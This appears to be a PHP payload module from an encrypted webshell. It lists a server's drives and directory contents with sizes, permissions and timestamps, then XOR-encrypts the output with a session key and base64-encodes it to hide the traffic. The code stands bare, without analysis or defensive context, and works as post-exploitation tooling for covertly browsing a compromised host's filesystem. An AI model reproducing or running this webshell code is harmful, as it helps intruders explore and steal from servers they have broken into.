error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

function getSafeStr($str)
{
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}


function main($path = "")
{
	if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
    {
        for($i=65;$i<=90;$i++)
    	{
    		$drive=chr($i).':\\';
    		file_exists($drive) ? $driveList=$driveList.$drive.",":'';
    	}
    }
	else
	{
		$driveList="/";
	}
    $currentPath=getcwd()."/";
	$result=$driveList."\r\n".$currentPath."\r\n";
    if($path == "") $path = getcwd()."/";
    $allFiles = scandir($path);
            foreach ($allFiles as $fileName) {
                $fullPath = $path . $fileName;
				if($fileName!='..'&&$fileName!='.'){
					if (!function_exists("mb_convert_encoding"))
					{
					  $fileName=getSafeStr($fileName);
					}
					else
					{
						
						$fileName=mb_convert_encoding($fileName, 'UTF-8', mb_detect_encoding($fileName, array("ASCII","GB2312","GBK","UTF-8")));
					}
					if (is_file($fullPath)) {
						$result=$result.$fileName;
					} else {
						$result=$result."dic:".$fileName;
					}
					$result=$result."\t".filesize($fullPath);
					$result=$result."\t".substr(base_convert(@fileperms($fullPath),10,8),-4);
					$result=$result."\t".date("Y-m-d H:i:s", filemtime($fullPath))."\n";
				}
            }
    echo encrypt($result, $_SESSION['k']);        
}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15]; 
    }
	return base64_encode($data);
}